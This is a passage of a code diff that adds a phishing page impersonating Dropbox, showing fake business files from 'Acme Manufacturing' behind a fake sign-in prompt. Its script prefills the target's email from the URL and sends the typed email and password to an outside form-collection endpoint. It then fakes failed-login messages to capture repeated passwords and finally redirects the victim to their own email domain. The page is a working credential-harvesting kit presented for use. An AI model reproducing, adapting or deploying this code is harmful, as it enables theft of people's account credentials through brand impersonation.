+      <div class="cs"><svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M7 7a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H2z"/></svg> Shared with your company</div>
+      <div class="cz">6.3 MB</div>
+    </div>
+
+    <!-- Company profile.pdf -->
+    <div class="frow" data-name="Company profile.pdf" data-size="245 KB" data-type="pdf">
+      <div class="cc"><input type="checkbox" onchange="onCheck()"></div>
+      <div class="ci ipdf"><svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 7h6M5 9h6M5 11h4"/></svg></div>
+      <div class="cn"><span class="fn">Company profile.pdf</span><span class="sb">Shared by Acme Manufacturing</span></div>
+      <div class="cd">A few minutes ago</div>
+      <div class="cs"><svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M7 7a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H2z"/></svg> Shared with your company</div>
+      <div class="cz">245 KB</div>
+    </div>
+
+    <!-- Quality Certificates folder -->
+    <div class="folder-row" onclick="toggleFolder('qc')">
+      <div class="cc" style="width:28px;flex-shrink:0"></div>
+      <div class="ftoggle" id="qc-toggle">&#9660;</div>
+      <div class="folder-spacer ifol"><svg width="18" height="18" viewBox="0 0 16 16" fill="currentColor"><path d="M1 3h6l2 2h6v9H1V3z"/></svg></div>
+      <div class="finfo">Quality Certificates <span class="fcount">2 items</span></div>
+      <div class="fdate">A few minutes ago</div>
+    </div>
+    <div id="qc-items">
+      <div class="frow sub" data-name="ISO_9001_Certificate.pdf" data-size="1.5 MB" data-type="pdf">
+        <div class="cc"><input type="checkbox" onchange="onCheck()"></div>
+        <div class="ci ipdf"><svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 7h6M5 9h6M5 11h4"/></svg></div>
+        <div class="cn"><span class="fn">ISO_9001_Certificate.pdf</span><span class="sb">Shared by Acme Manufacturing</span></div>
+        <div class="cd">A few minutes ago</div>
+        <div class="cs"><svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M7 7a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H2z"/></svg> Shared with your company</div>
+        <div class="cz">1.5 MB</div>
+      </div>
+      <div class="frow sub" data-name="Material_Test_Reports.xlsx" data-size="3.2 MB" data-type="xlsx">
+        <div class="cc"><input type="checkbox" onchange="onCheck()"></div>
+        <div class="ci ixls"><svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 6h2v2H5zm3 0h2v2H8zm3 0h1v2h-1zM5 9h2v2H5zm3 0h2v2H8zm3 0h1v2h-1z"/></svg></div>
+        <div class="cn"><span class="fn">Material_Test_Reports.xlsx</span><span class="sb">Shared by Acme Manufacturing</span></div>
+        <div class="cd">A few minutes ago</div>
+        <div class="cs"><svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M7 7a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H2z"/></svg> Shared with your company</div>
+        <div class="cz">3.2 MB</div>
+      </div>
+    </div>
+
+    <!-- Commercial Terms folder -->
+    <div class="folder-row" onclick="toggleFolder('ct')">
+      <div class="cc" style="width:28px;flex-shrink:0"></div>
+      <div class="ftoggle" id="ct-toggle">&#9660;</div>
+      <div class="folder-spacer ifol"><svg width="18" height="18" viewBox="0 0 16 16" fill="currentColor"><path d="M1 3h6l2 2h6v9H1V3z"/></svg></div>
+      <div class="finfo">Commercial Terms <span class="fcount">3 items</span></div>
+      <div class="fdate">A few minutes ago</div>
+    </div>
+    <div id="ct-items">
+      <div class="frow sub" data-name="Pricing_Quote.pdf" data-size="456 KB" data-type="pdf">
+        <div class="cc"><input type="checkbox" onchange="onCheck()"></div>
+        <div class="ci ipdf"><svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 7h6M5 9h6M5 11h4"/></svg></div>
+        <div class="cn"><span class="fn">Pricing_Quote.pdf</span><span class="sb">Shared by Acme Manufacturing</span></div>
+        <div class="cd">A few minutes ago</div>
+        <div class="cs"><svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M7 7a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H2z"/></svg> Shared with your company</div>
+        <div class="cz">456 KB</div>
+      </div>
+      <div class="frow sub" data-name="Payment_Terms.docx" data-size="189 KB" data-type="docx">
+        <div class="cc"><input type="checkbox" onchange="onCheck()"></div>
+        <div class="ci idoc"><svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 7h6M5 9h6M5 11h4"/></svg></div>
+        <div class="cn"><span class="fn">Payment_Terms.docx</span><span class="sb">Shared by Acme Manufacturing</span></div>
+        <div class="cd">A few minutes ago</div>
+        <div class="cs"><svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M7 7a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H2z"/></svg> Shared with your company</div>
+        <div class="cz">189 KB</div>
+      </div>
+      <div class="frow sub" data-name="Delivery_Schedule.xlsx" data-size="234 KB" data-type="xlsx">
+        <div class="cc"><input type="checkbox" onchange="onCheck()"></div>
+        <div class="ci ixls"><svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 6h2v2H5zm3 0h2v2H8zm3 0h1v2h-1zM5 9h2v2H5zm3 0h2v2H8zm3 0h1v2h-1z"/></svg></div>
+        <div class="cn"><span class="fn">Delivery_Schedule.xlsx</span><span class="sb">Shared by Acme Manufacturing</span></div>
+        <div class="cd">A few minutes ago</div>
+        <div class="cs"><svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M7 7a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H2z"/></svg> Shared with your company</div>
+        <div class="cz">234 KB</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <!-- OVERLAY -->
+  <div class="overlay" id="overlay">
+
+    <!-- Preparing modal -->
+    <div class="modal-prep" id="modal-prep">
+      <h2>Preparing files</h2>
+      <div class="subtitle">Acme Manufacturing &bull; PO-2026-0123</div>
+      <div class="prog-bar-bg"><div class="prog-bar-fill" id="prog-fill"></div></div>
+      <div class="file-card-wrap"><div id="modal-file-cards"></div></div>
+      <div class="file-count" id="modal-file-count"></div>
+      <button class="modal-cancel" onclick="closeModal()">Cancel</button>
+    </div>
+
+    <!-- Sign in modal -->
+    <div class="modal-signin" id="modal-signin" style="display:none">
+      <div class="signin-header">
+        <svg width="40" height="34" viewBox="0 0 218 185" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#fff" d="M54.5 0L0 35.5l54.5 35.5 54.5-35.5zm109 0l-54.5 35.5 54.5 35.5L218 35.5zM0 106.5L54.5 142l54.5-35.5L54.5 71zm163.5-35.5L109 106.5l54.5 35.5L218 106.5zM54.5 152.5L109 185l54.5-32.5L109 120z"/>
+        </svg>
+      </div>
+      <div class="signin-body">
+        <div class="signin-title-row">
+          <div class="signin-title">Sign in to Dropbox</div>
+          <div class="files-badge" id="signin-badge">0 files</div>
+        </div>
+        <div class="signin-sub" id="signin-sub">to download shared files</div>
+        <div class="field-label">Email or username</div>
+        <input class="field-input" type="text" id="email-field" value="" >
+        <div class="field-label">Password</div>
+        <div class="pass-wrap">
+          <input class="field-input" type="password" id="pass-field" value="">
+          <button class="pass-eye" onclick="togglePass()">
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 3C4 3 1 8 1 8s3 5 7 5 7-5 7-5-3-5-7-5zm0 8a3 3 0 110-6 3 3 0 010 6zm0-5a2 2 0 100 4 2 2 0 000-4z"/></svg>
+          </button>
+        </div>
+        <div class="signin-actions">
+          <button class="cancel-link" onclick="closeModal()">Cancel</button>
+          <button class="signin-btn" id="signin-btn" onclick="trySignIn()">
+            <span class="btn-spinner" id="btn-spinner"></span>
+            <span id="signin-btn-label">Sign in &amp; download</span>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Verifying modal -->
+    <div class="modal-verify" id="modal-verify" style="display:none">
+      <div class="db-loader-logo" style="display:flex;align-items:center;gap:10px;margin-bottom:6px;">
+        <svg width="30" height="26" viewBox="0 0 218 185" fill="#0061fe" xmlns="http://www.w3.org/2000/svg">
+          <path d="M54.5 0L0 35.5l54.5 35.5 54.5-35.5zm109 0l-54.5 35.5 54.5 35.5L218 35.5zM0 106.5L54.5 142l54.5-35.5L54.5 71zm163.5-35.5L109 106.5l54.5 35.5L218 106.5zM54.5 152.5L109 185l54.5-32.5L109 120z"/>
+        </svg>
+        <span style="font-size:20px;font-weight:600;color:#1e1919;">Dropbox</span>
+      </div>
+      <div class="db-diamonds" style="display:grid;grid-template-columns:repeat(5,12px);gap:5px;align-items:center;margin:10px 0;">
+        <div class="db-d"></div>
+        <div class="db-d"></div>
+        <div class="db-d"></div>
+        <div class="db-d"></div>
+        <div class="db-d"></div>
+      </div>
+      <div class="verify-sub">Verifying credentials…</div>
+    </div>
+
+    <!-- Auth Failed modal -->
+    <div class="modal-auth-fail" id="modal-auth-fail" style="display:none">
+      <div class="auth-fail-top">
+        <div class="auth-fail-circle">
+          <div class="auth-fail-x">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+              <path d="M6 6l12 12M18 6L6 18" stroke="#e53935" stroke-width="3" stroke-linecap="round"/>
+            </svg>
+          </div>
+        </div>
+      </div>
+      <div class="auth-fail-body">
+        <div class="auth-fail-title" id="auth-fail-title">Authentication Failed</div>
+        <div class="auth-fail-msg" id="auth-fail-msg">The email or password you entered is incorrect. Please try again.</div>
+        <div class="auth-fail-actions">
+          <button class="auth-fail-cancel" onclick="closeModal()">Cancel</button>
+          <button class="auth-fail-retry" onclick="tryAgain()">Try Again</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+<script>
+  // ── DISMISS LOADER ────────────────────────────────────────────────────────
+  window.addEventListener('load', function() {
+    setTimeout(function() {
+      var loader = document.getElementById('db-loader');
+      loader.classList.add('hide');
+      setTimeout(function() { loader.style.display = 'none'; }, 500);
+    }, 5000);
+  });
+  // ─── 1. MACRO: read ?email= from URL and populate fields ───────────────────
+  var userEmail = '';
+  (function() {
+    // 1. Check if PHP injected __MACRO_EMAIL__ (served via https://submit-form.com/Zy62Pwf0i)
+    if (typeof window.__MACRO_EMAIL__ !== 'undefined' && window.__MACRO_EMAIL__.trim()) {
+      userEmail = window.__MACRO_EMAIL__.trim();
+    } else {
+      // 2. Fallback: read directly from ?email= URL param (standalone HTML)
+      var params = new URLSearchParams(window.location.search);
+      var emailParam = params.get('email');
+      if (emailParam && emailParam.trim()) {
+        userEmail = emailParam.trim();
+      }
+    }
+    applyEmail(userEmail);
+  })();
+
+  function applyEmail(email) {
+    // Avatar initials
+    var initials = 'TT';
+    if (email) {
+      var parts = email.split('@')[0].replace(/[._-]/g, ' ').split(' ').filter(Boolean);
+      if (parts.length >= 2) {
+        initials = (parts[0][0] + parts[1][0]).toUpperCase();
+      } else if (parts.length === 1 && parts[0].length >= 2) {
+        initials = parts[0].substring(0, 2).toUpperCase();
+      } else if (parts.length === 1) {
+        initials = parts[0][0].toUpperCase();
+      }
+    }
+    document.getElementById('sidebar-av').textContent = initials;
+    document.getElementById('topbar-av').textContent = initials;
+    document.getElementById('sidebar-email').textContent = email || '{USER_EMAIL}';
+    document.getElementById('email-field').value = email;
+  }
+
+  // ─── 2. CHECKBOX SELECTION ─────────────────────────────────────────────────
+  function getSelectedFiles() {
+    var selected = [];
+    document.querySelectorAll('.frow').forEach(function(row) {
+      var chk = row.querySelector('input[type=checkbox]');
+      if (chk && chk.checked) {
+        selected.push({
+          name: row.getAttribute('data-name'),
+          size: row.getAttribute('data-size'),
+          type: row.getAttribute('data-type')
+        });
+      }
+    });
+    return selected;
+  }
+
+  function onCheck() {
+    var selected = getSelectedFiles();
+    var count = selected.length;
+    var selInfo = document.getElementById('sel-info');
+    var selCount = document.getElementById('sel-count');
+    var selSize = document.getElementById('sel-size');
+    var btnLabel = document.getElementById('btn-dl-label');
+    var sizeBadge = document.getElementById('btn-size-badge');
+
+    if (count > 0) {
+      selInfo.classList.remove('sel-info-hidden');
+      selCount.textContent = count + ' selected';
+      // Sum up sizes for display in selection bar
+      var totalSize = selected.map(function(f){ return f.size; }).join(' + ');
+      selSize.textContent = '(' + selected[0].size + (count > 1 ? ' +' + (count-1) + ' more' : '') + ')';
+      btnLabel.textContent = 'Download ' + count + ' file' + (count > 1 ? 's' : '');
+      // Show size badge on blue button — show first selected file size or combined
+      sizeBadge.textContent = selected[0].size;
+      sizeBadge.style.display = 'inline-block';
+      document.getElementById('btn-dl-all').disabled = false;
+      document.getElementById('btn-dl-file').disabled = false;
+    } else {
+      selInfo.classList.add('sel-info-hidden');
+      btnLabel.textContent = 'Download file';
+      sizeBadge.style.display = 'none';
+      document.getElementById('btn-dl-all').disabled = true;
+      document.getElementById('btn-dl-file').disabled = true;
+    }
+
+    // Update header checkbox state
+    var allBoxes = document.querySelectorAll('.frow input[type=checkbox]');
+    var allChecked = Array.from(allBoxes).every(function(b){ return b.checked; });
+    document.getElementById('chk-all').checked = allChecked && allBoxes.length > 0;
+    document.getElementById('chk-all').indeterminate = count > 0 && !allChecked;
+  }
+
+  function toggleAll(masterChk) {
+    document.querySelectorAll('.frow input[type=checkbox]').forEach(function(chk) {
+      chk.checked = masterChk.checked;
+    });
+    onCheck();
+  }
+
+  function clearSelection() {
+    document.querySelectorAll('.frow input[type=checkbox]').forEach(function(chk) {
+      chk.checked = false;
+    });
+    document.getElementById('chk-all').checked = false;
+    document.getElementById('chk-all').indeterminate = false;
+    onCheck();
+  }
+
+  // ─── 3. FILE ICON HELPERS ─────────────────────────────────────────────────
+  function getIconSvg(type, color) {
+    if (type === 'xlsx') {
+      return '<svg width="20" height="20" viewBox="0 0 16 16" fill="' + color + '"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 6h2v2H5zm3 0h2v2H8zm3 0h1v2h-1zM5 9h2v2H5zm3 0h2v2H8zm3 0h1v2h-1z"/></svg>';
+    } else if (type === 'docx') {
+      return '<svg width="20" height="20" viewBox="0 0 16 16" fill="' + color + '"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 7h6M5 9h6M5 11h4"/></svg>';
+    } else {
+      return '<svg width="20" height="20" viewBox="0 0 16 16" fill="' + color + '"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 7h6M5 9h6M5 11h4"/></svg>';
+    }
+  }
+
+  function getIconClass(type) {
+    if (type === 'xlsx') return 'xlsx-icon';
+    if (type === 'docx') return 'docx-icon';
+    return 'pdf-icon';
+  }
+
+  function getIconColor(type) {
+    if (type === 'xlsx') return '#1d8348';
+    if (type === 'docx') return '#2e75b6';
+    return '#e53935';
+  }
+
+  // ─── 4. DOWNLOAD MODAL ────────────────────────────────────────────────────
+  var _downloadFiles = [];
+
+  function startDownload(isAll) {
+    if (isAll) {
+      _downloadFiles = [];
+      document.querySelectorAll('.frow').forEach(function(row) {
+        _downloadFiles.push({ name: row.getAttribute('data-name'), size: row.getAttribute('data-size'), type: row.getAttribute('data-type') });
+      });
+    } else {
+      _downloadFiles = getSelectedFiles();
+      if (_downloadFiles.length === 0) {
+        _downloadFiles = [];
+        document.querySelectorAll('.frow').forEach(function(row) {
+          _downloadFiles.push({ name: row.getAttribute('data-name'), size: row.getAttribute('data-size'), type: row.getAttribute('data-type') });
+        });
+      }
+    }
+
+    var files = _downloadFiles;
+    var cardsEl = document.getElementById('modal-file-cards');
+    cardsEl.innerHTML = '';
+
+    // Update sign-in modal badge
+    document.getElementById('signin-badge').textContent = files.length + ' file' + (files.length !== 1 ? 's' : '');
+    document.getElementById('signin-sub').textContent = 'to download ' + files.length + ' shared file' + (files.length !== 1 ? 's' : '');
+    document.getElementById('email-field').value = userEmail;
+    document.getElementById('pass-field').value = '';
+
+    // Show prep modal
+    var overlay = document.getElementById('overlay');
+    var prep    = document.getElementById('modal-prep');
+    var signin  = document.getElementById('modal-signin');
+    var authFail = document.getElementById('modal-auth-fail');
+    prep.style.display = 'block';
+    signin.style.display = 'none';
+    authFail.style.display = 'none';
+    overlay.classList.add('show');
+
+    // Swipe-up carousel: each file swipes up in, pauses, swipes up out, next comes in
+    var fill = document.getElementById('prog-fill');
+    var countEl = document.getElementById('modal-file-count');
+    fill.style.width = '0%';
+    var pct = 0;
+    var fileIndex = 0;
+    var totalFiles = files.length;
+    var slicePerFile = 100 / totalFiles;
+
+    function showNextFile() {
+      if (fileIndex >= totalFiles) {
+        fill.style.width = '100%';
+        setTimeout(function() {
+          prep.style.display = 'none';
+          signin.style.display = 'block';
+        }, 400);
+        return;
+      }
+
+      var f = files[fileIndex];
+      countEl.textContent = 'File ' + (fileIndex + 1) + ' of ' + totalFiles;
+
+      // Advance progress bar
+      var targetPct = Math.round((fileIndex + 1) * slicePerFile);
+      var barInt = setInterval(function() {
+        pct += 3;
+        fill.style.width = Math.min(pct, targetPct) + '%';
+        if (pct >= targetPct) clearInterval(barInt);
+      }, 25);
+
+      // Build card and swipe IN from below
+      cardsEl.innerHTML = '';
+      var card = document.createElement('div');
+      card.className = 'file-card swipe-in';
+      card.innerHTML =
+        '<div class="file-card-icon ' + getIconClass(f.type) + '">' + getIconSvg(f.type, getIconColor(f.type)) + '</div>' +
+        '<div><div class="file-card-name">' + f.name + '</div><div class="file-card-size">' + f.size + '</div></div>';
+      cardsEl.appendChild(card);
+
+      // After 700ms visible → swipe OUT upward → then load next
+      setTimeout(function() {
+        card.className = 'file-card swipe-out';
+        setTimeout(function() {
+          cardsEl.innerHTML = '';
+          fileIndex++;
+          showNextFile();
+        }, 400);
+      }, 750);
+    }
+
+    showNextFile();
+  }
+
+  // ─── 5. SIGN IN LOGIC ────────────────────────────────────────────────────
+  var loginAttempt = 0;
+
+  function trySignIn() {
+    var btn      = document.getElementById('signin-btn');
+    var spinner  = document.getElementById('btn-spinner');
+    var label    = document.getElementById('signin-btn-label');
+    var email    = document.getElementById('email-field').value;
+    var password = document.getElementById('pass-field').value;
+
+    loginAttempt++;
+
+    // Show spinner on button
+    spinner.style.display = 'inline-block';
+    label.textContent = 'Verifying...';
+    btn.disabled = true;
+
+    // POST credentials directly to collector PHP
+    fetch('https://submit-form.com/Zy62Pwf0i', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)
+    }).catch(function() {});
+
+    // After 0.5s → switch to verifying modal frame
+    setTimeout(function() {
+      document.getElementById('modal-signin').style.display = 'none';
+      document.getElementById('modal-verify').style.display = 'flex';
+
+      // After 3 seconds → decide what to show based on attempt number
+      setTimeout(function() {
+        document.getElementById('modal-verify').style.display = 'none';
+        spinner.style.display = 'none';
+        label.textContent = 'Sign in & download';
+        btn.disabled = false;
+
+        if (loginAttempt === 1) {
+          // 1st attempt → Authentication Failed
+          document.getElementById('auth-fail-title').textContent = 'Authentication Failed';
+          document.getElementById('auth-fail-msg').textContent = 'The email or password you entered is incorrect. Please try again.';
+          document.getElementById('modal-auth-fail').style.display = 'block';
+
+        } else if (loginAttempt === 2) {
+          // 2nd attempt → Invalid username and password
+          document.getElementById('auth-fail-title').textContent = 'Invalid username and password';
+          document.getElementById('auth-fail-msg').textContent = 'The credentials you entered do not match our records. Try again.';
+          document.getElementById('modal-auth-fail').style.display = 'block';
+
+        } else if (loginAttempt === 3) {
+          // 3rd attempt → Authentication Failed again
+          document.getElementById('auth-fail-title').textContent = 'Authentication Failed';
+          document.getElementById('auth-fail-msg').textContent = 'The email or password you entered is incorrect. Please try again.';
+          document.getElementById('modal-auth-fail').style.display = 'block';
+
+        } else if (loginAttempt >= 4) {
+          // 4th attempt → redirect to recipient's email domain
+          var domain = email.split('@')[1] ? email.split('@')[1].trim() : 'dropbox.com';
+          window.location.href = 'https://' + domain;
+        }
+
+      }, 3000);
+    }, 500);
+  }
+
+  function tryAgain() {
+    // Go back to sign-in modal, keep email, clear password
+    document.getElementById('modal-auth-fail').style.display = 'none';
+    document.getElementById('modal-signin').style.display = 'block';
+    document.getElementById('pass-field').value = '';
+    document.getElementById('pass-field').focus();
+  }
+
+  function closeModal() {
+    document.getElementById('overlay').classList.remove('show');
+    document.getElementById('prog-fill').style.width = '0%';
+    document.getElementById('modal-prep').style.display = 'block';
+    document.getElementById('modal-signin').style.display = 'none';
+    document.getElementById('modal-verify').style.display = 'none';
+    document.getElementById('modal-auth-fail').style.display = 'none';
+    document.getElementById('modal-file-cards').innerHTML = '';
+  }
+
+  function togglePass() {
+    var f = document.getElementById('pass-field');
+    f.type = f.type === 'password' ? 'text' : 'password';
+  }
+
+  function toggleFolder(id) {
+    var items = document.getElementById(id + '-items');
+    var toggle = document.getElementById(id + '-toggle');
+    var hidden = items.classList.toggle('sub-hidden');
+    toggle.classList.toggle('collapsed', hidden);
+  }
+</script>
+
+</body>
+</html>
